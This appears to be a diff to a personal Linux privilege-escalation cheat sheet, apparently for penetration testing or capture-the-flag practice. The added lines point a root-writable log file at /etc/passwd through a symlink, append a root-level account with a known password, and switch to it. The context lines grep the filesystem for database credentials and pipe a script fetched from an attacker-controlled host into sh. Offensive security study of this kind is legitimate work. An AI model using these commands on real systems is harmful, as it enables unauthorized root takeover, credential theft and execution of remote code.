@@ -1316,6 +1316,12 @@ find / -group developer 2>/dev/null
 +---------- Find Usernames + Passwords ----------+
 (grep -IrinE '^\s*db[-_]?user\w*\s*=\s*|^\s*db[-_]?pass\w*\s*=\s*' / 2>/dev/null &)
 
++---------- Symlink: Writeable Root File ----------+
+ln -sf /etc/passwd /var/log/below/error_root.log
+
++---------- Write: /etc/passwd ----------+
+echo "any:$(openssl passwd -1 root):0:0:root:/root:/bin/bash" >> /etc/passwd && echo 'The password is: root'; su any
+
 +---------- None Absolute Path (suid) ----------+
 strace -f -o file /usr/local/bin/suid-name
 cat file | grep -rine 'chmod '
@@ -1330,9 +1336,6 @@ cat /root/root.txt
 +---------- Polkit Version ----------+
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
 apt list --installed 2>/dev/null | grep -i policykit
-
-+---------- Services Running ----------+
-systemctl list-units --type=service --state=running
 
 +---------- Port Scan Gateway ----------+
 curl -s $MYIP:8888/linux/nmap | sh
